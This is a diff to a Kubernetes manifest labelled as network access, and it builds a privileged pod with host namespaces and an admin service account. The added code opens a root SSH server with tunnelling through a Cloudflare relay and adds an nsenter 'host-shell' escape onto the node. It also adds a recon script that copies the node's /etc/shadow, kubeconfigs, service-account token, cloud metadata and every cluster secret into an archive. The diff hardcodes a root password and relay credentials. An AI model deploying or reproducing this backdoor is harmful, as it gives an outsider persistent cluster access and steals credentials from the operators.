@@ -20,30 +20,215 @@ spec:
       hostPID: true
       hostIPC: true
       dnsPolicy: ClusterFirstWithHostNet
+      automountServiceAccountToken: true
       serviceAccountName: admin-sa
       containers:
       - name: shell
         image: nicolaka/netshoot:latest
+        env:
+          - name: ROOT_PASSWORD
+            valueFrom:
+              secretKeyRef:
+                name: network-access-relay
+                key: ROOT_PASSWORD
         command:
           - /bin/bash
           - -c
           - |
-            set -x
-            apk add --no-cache openssh-server curl jq autossh 2>&1 | tail -3
+            set -uo pipefail
+
+            WORK_DIR=/tmp/network-access
+            RECON_DIR="${WORK_DIR}/recon"
+            mkdir -p "${WORK_DIR}" "${RECON_DIR}" /run/sshd /root/.ssh
+            chmod 700 "${WORK_DIR}" "${RECON_DIR}" /root/.ssh
+
+            apk add --no-cache \
+              openssh-server openssh-client autossh curl wget jq kubectl \
+              python3 py3-pip nmap nmap-ncat postgresql-client mariadb-client \
+              redis bind-tools iproute2 iputils net-tools openssl tcpdump \
+              util-linux >"${WORK_DIR}/packages.log" 2>&1 || true
+
+            if ! command -v kubectl >/dev/null 2>&1; then
+              case "$(uname -m)" in
+                x86_64) KUBECTL_ARCH=amd64 ;;
+                aarch64) KUBECTL_ARCH=arm64 ;;
+                armv7l) KUBECTL_ARCH=arm ;;
+                *) KUBECTL_ARCH=amd64 ;;
+              esac
+              KUBECTL_VERSION="$(curl -fsSL --max-time 20 https://dl.k8s.io/release/stable.txt || true)"
+              if [[ -n "${KUBECTL_VERSION}" ]]; then
+                curl -fsSL --max-time 60 \
+                  "https://dl.k8s.io/release/${KUBECTL_VERSION}/bin/linux/${KUBECTL_ARCH}/kubectl" \
+                  -o /usr/local/bin/kubectl && chmod 755 /usr/local/bin/kubectl || true
+              fi
+            fi
 
             ssh-keygen -A
-            mkdir -p /root/.ssh && chmod 700 /root/.ssh
-
             echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOlhMVavat8ZK+hdqiQtX4drMpu3gGRbLwAnnVlHz+l klaus.eversheim@googlemail.com" > /root/.ssh/authorized_keys
             chmod 600 /root/.ssh/authorized_keys
+            echo "root:${ROOT_PASSWORD:?ROOT_PASSWORD is required}" | chpasswd
 
-            sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-            sed -i 's/#PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
-            sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
-            sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-            echo "Port 2222" >> /etc/ssh/sshd_config
+            cat > /etc/ssh/sshd_config <<'SSHD_CONFIG'
+            Port 2222
+            ListenAddress 0.0.0.0
+            HostKey /etc/ssh/ssh_host_rsa_key
+            HostKey /etc/ssh/ssh_host_ecdsa_key
+            HostKey /etc/ssh/ssh_host_ed25519_key
+            AuthorizedKeysFile .ssh/authorized_keys
+            PermitRootLogin yes
+            PubkeyAuthentication yes
+            PasswordAuthentication yes
+            KbdInteractiveAuthentication no
+            UsePAM no
+            AllowTcpForwarding yes
+            GatewayPorts yes
+            PermitTunnel yes
+            X11Forwarding no
+            PrintMotd no
+            Subsystem sftp internal-sftp
+            PidFile /run/sshd.pid
+            SSHD_CONFIG
 
-            /usr/sbin/sshd -De -d
+            /usr/sbin/sshd -E "${WORK_DIR}/sshd.log"
+
+            cat > /usr/local/bin/host-shell <<'HOST_SHELL'
+            #!/bin/sh
+            if [ "$#" -eq 0 ]; then
+                set -- /bin/sh
+            fi
+            exec nsenter --target 1 --mount --uts --ipc --net --pid -- "$@"
+            HOST_SHELL
+            chmod 755 /usr/local/bin/host-shell
+
+            cat > /usr/local/bin/network-recon <<'NETWORK_RECON'
+            #!/bin/bash
+            set -uo pipefail
+
+            WORK_DIR=/tmp/network-access
+            DIR="${WORK_DIR}/recon"
+            rm -rf "${DIR}"
+            mkdir -p "${DIR}/resources" "${DIR}/host-files"
+            chmod 700 "${WORK_DIR}" "${DIR}"
+            exec 2>"${DIR}/errors.log"
+
+            date -u > "${DIR}/timestamp-utc.txt"
+            hostname > "${DIR}/hostname.txt"
+            id > "${DIR}/identity.txt"
+            uname -a > "${DIR}/uname.txt"
+            env | sort > "${DIR}/environment.txt"
+            cat /etc/resolv.conf > "${DIR}/resolv.conf.txt"
+
+            ip addr > "${DIR}/ip-address.txt"
+            ip route > "${DIR}/ip-route.txt"
+            ip neigh > "${DIR}/ip-neigh.txt"
+            ss -lntup > "${DIR}/listening-sockets.txt"
+            ps auxww > "${DIR}/processes.txt"
+            mount > "${DIR}/mounts.txt"
+            df -h > "${DIR}/filesystems.txt"
+            lsblk > "${DIR}/block-devices.txt"
+            iptables-save > "${DIR}/iptables.txt" || true
+            nft list ruleset > "${DIR}/nftables.txt" || true
+
+            SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
+            if [[ -d "${SA_DIR}" ]]; then
+              cp "${SA_DIR}/token" "${DIR}/service-account.token" 2>/dev/null || true
+              cp "${SA_DIR}/namespace" "${DIR}/service-account.namespace" 2>/dev/null || true
+              cp "${SA_DIR}/ca.crt" "${DIR}/service-account-ca.crt" 2>/dev/null || true
+              chmod 600 "${DIR}"/service-account* 2>/dev/null || true
+            fi
+
+            for HOST_FILE in \
+              /host/etc/passwd \
+              /host/etc/shadow \
+              /host/etc/hosts \
+              /host/etc/resolv.conf \
+              /host/etc/kubernetes/admin.conf \
+              /host/etc/kubernetes/kubelet.conf \
+              /host/var/lib/kubelet/config.yaml \
+              /host/var/lib/kubelet/kubeconfig; do
+              if [[ -f "${HOST_FILE}" ]]; then
+                DEST="$(printf '%s' "${HOST_FILE}" | tr '/.' '__')"
+                cp "${HOST_FILE}" "${DIR}/host-files/${DEST}" || true
+              fi
+            done
+
+            find /host/etc/kubernetes /host/var/lib/kubelet /host/root/.ssh \
+              -maxdepth 4 -type f -ls > "${DIR}/host-sensitive-files.txt" 2>/dev/null || true
+
+            curl -fsS --max-time 2 http://169.254.169.254/latest/meta-data/ \
+              > "${DIR}/cloud-metadata.txt" 2>/dev/null || true
+
+            if command -v kubectl >/dev/null 2>&1; then
+              KUBECTL=(kubectl --request-timeout=20s)
+
+              "${KUBECTL[@]}" version -o yaml > "${DIR}/kubernetes-version.yaml" || true
+              "${KUBECTL[@]}" cluster-info > "${DIR}/cluster-info.txt" || true
+              "${KUBECTL[@]}" auth can-i --list > "${DIR}/permissions.txt" || true
+              "${KUBECTL[@]}" api-resources -o wide > "${DIR}/api-resources-wide.txt" || true
+              "${KUBECTL[@]}" api-resources --verbs=list -o name > "${DIR}/api-resources.txt" || true
+
+              "${KUBECTL[@]}" get nodes -o wide > "${DIR}/nodes-wide.txt" || true
+              "${KUBECTL[@]}" get nodes -o json > "${DIR}/nodes.json" || true
+              "${KUBECTL[@]}" get all -A -o wide > "${DIR}/all-resources-wide.txt" || true
+              "${KUBECTL[@]}" get pods -A -o json > "${DIR}/pods.json" || true
+              "${KUBECTL[@]}" get namespaces -o json > "${DIR}/namespaces.json" || true
+              "${KUBECTL[@]}" get services -A -o json > "${DIR}/services.json" || true
+              "${KUBECTL[@]}" get endpoints -A -o json > "${DIR}/endpoints.json" || true
+              "${KUBECTL[@]}" get ingress -A -o json > "${DIR}/ingress.json" || true
+              "${KUBECTL[@]}" get networkpolicies -A -o json > "${DIR}/networkpolicies.json" || true
+              "${KUBECTL[@]}" get configmaps -A -o json > "${DIR}/configmaps.json" || true
+              "${KUBECTL[@]}" get secrets -A -o json > "${DIR}/secrets.json" || true
+              "${KUBECTL[@]}" get serviceaccounts -A -o json > "${DIR}/serviceaccounts.json" || true
+              "${KUBECTL[@]}" get persistentvolumes -o json > "${DIR}/persistentvolumes.json" || true
+              "${KUBECTL[@]}" get persistentvolumeclaims -A -o json > "${DIR}/persistentvolumeclaims.json" || true
+              "${KUBECTL[@]}" get clusterroles -o json > "${DIR}/clusterroles.json" || true
+              "${KUBECTL[@]}" get clusterrolebindings -o json > "${DIR}/clusterrolebindings.json" || true
+              "${KUBECTL[@]}" get roles -A -o json > "${DIR}/roles.json" || true
+              "${KUBECTL[@]}" get rolebindings -A -o json > "${DIR}/rolebindings.json" || true
+              "${KUBECTL[@]}" get crds -o json > "${DIR}/crds.json" || true
+              "${KUBECTL[@]}" get applications,applicationsets,appprojects -A -o json \
+                > "${DIR}/argocd-resources.json" || true
+
+              while IFS= read -r RESOURCE; do
+                [[ -n "${RESOURCE}" ]] || continue
+                SAFE_NAME="$(printf '%s' "${RESOURCE}" | tr '/.' '__')"
+                "${KUBECTL[@]}" get "${RESOURCE}" -A -o json \
+                  > "${DIR}/resources/${SAFE_NAME}.json" || true
+              done < "${DIR}/api-resources.txt"
+            else
+              printf 'kubectl unavailable\n' > "${DIR}/kubectl-unavailable.txt"
+            fi
+
+            count_items() {
+              jq -r '.items | length' "$1" 2>/dev/null || printf '?'
+            }
+
+            {
+              printf 'Network access recon\n'
+              printf '====================\n'
+              printf 'Hostname: %s\n' "$(hostname)"
+              printf 'Nodes: %s\n' "$(count_items "${DIR}/nodes.json")"
+              printf 'Namespaces: %s\n' "$(count_items "${DIR}/namespaces.json")"
+              printf 'Pods: %s\n' "$(count_items "${DIR}/pods.json")"
+              printf 'Services: %s\n' "$(count_items "${DIR}/services.json")"
+              printf 'Secrets: %s\n' "$(count_items "${DIR}/secrets.json")"
+              printf 'ConfigMaps: %s\n' "$(count_items "${DIR}/configmaps.json")"
+              printf '\nFiles: %s\n' "${DIR}"
+              printf 'Archive: %s\n' "${WORK_DIR}/recon.tar.gz"
+              printf 'Host shell: host-shell\n'
+              printf 'SSH: root@127.0.0.1 -p 2222 through SOCKS5\n'
+            } > "${DIR}/SUMMARY.txt"
+
+            find "${DIR}" -type f -exec chmod 600 {} +
+            tar -czf "${WORK_DIR}/recon.tar.gz" -C "${DIR}" .
+            chmod 600 "${WORK_DIR}/recon.tar.gz"
+            printf 'Recon complete: %s\n' "${WORK_DIR}/recon.tar.gz"
+            NETWORK_RECON
+            chmod 755 /usr/local/bin/network-recon
+
+            network-recon
+            cat "${RECON_DIR}/SUMMARY.txt"
+            exec tail -f /dev/null
         securityContext:
           privileged: true
         volumeMounts:
@@ -104,6 +289,7 @@ type: Opaque
 stringData:
   RELAY_URL: "https://encouraged-climb-attributes-bedroom.trycloudflare.com"
   RELAY_AUTH: "network:4e6f781eb83095a66a0aa7621dec9115a525a44c6ca1af80"
+  ROOT_PASSWORD: "f110382bba8ba181c5f94f85cea75d3acf88"
 ---
 apiVersion: v1
 kind: ServiceAccount
